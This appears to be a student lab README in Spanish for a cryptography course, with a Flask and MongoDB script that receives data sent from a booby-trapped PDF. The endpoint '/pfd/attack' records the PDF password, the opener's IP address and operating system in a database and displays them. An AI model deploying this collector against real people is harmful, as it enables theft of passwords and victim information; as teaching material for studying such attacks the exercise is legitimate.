# cifrado simétrico y asimétrico
Se solicita emplear una API sencilla, que reciba datos desde un PDF vulnerado y se almacenen en una Base de datos. Estos deben tener una interfaz web sencilla a fin de presentar los resultados obtenidos. Dentro de los datos a recabar desde el documento malicioso, se encuentran los siguientes:
- La contraseña del archivo cifrado (en caso de realizar pruebas con documentos sin cifrar, cifrar manualmente y corroborar si los datos son enviados a la API).
- La dirección IP de quien abre el PDF.
- El sistema operativo y su versión.
## Stack de tecnologías
Para la actividad propuesta se hará uso de python flask y mongodb, los cuales deben ser instalados previamente para hacer uso de la api. Para instalar flask con pymongo se emplea el siguiente comando:
```pip install flask pymongo```

## Script utilizado
```python
from flask import Flask, jsonify, request, Response, render_template, redirect
from flask.helpers import url_for
from flask_pymongo import PyMongo


app = Flask(__name__, template_folder='templates')
app.config['MONGO_URI'] = 'mongodb://localhost/cripto-lab5'  #Creación de la bases de datos

mongo = PyMongo(app)

@app.route("/")
def home():
    pdf = mongo.db.pdf.find() #encuentra los elementos la colección de elementos
    return render_template("index.html", pdf=pdf)

@app.route('/pfd/attack', methods=['GET'])
def create_pdf():
    if request.method == 'GET':
        nameDoc = request.args.get('name') #obtenemos la variable name ''obtenida'' por la url
        passDoc = request.args.get('password') #obtenemos la variable ''password'' obtenida por la url
        ip = request.remote_addr
        systemDoc = request.args.get('os') #obtenemos la variable ''os'' obtenida por la url
        mongo.db.pdf.insert({'name':nameDoc,'password':passDoc,'ip':ip, 'so':systemDoc})
        return redirect(url_for("home"))
    else:
        return not_found()



@app.errorhandler(404)
def not_found(error=None):
    message = {
        'message': 'Resource Not Found ' + request.url,
        'status': 404
    }
    response = jsonify(message)
    response.status_code = 404
    return response


if __name__ == '__main__':
    app.run(debug=True, port=65000, host='192.168.0.4')
``` 
## Video demostrativo
https://drive.google.com/drive/u/1/folders/1YI7pCLg6_v7AaUPKR3mDzuTZeSCMP2O3
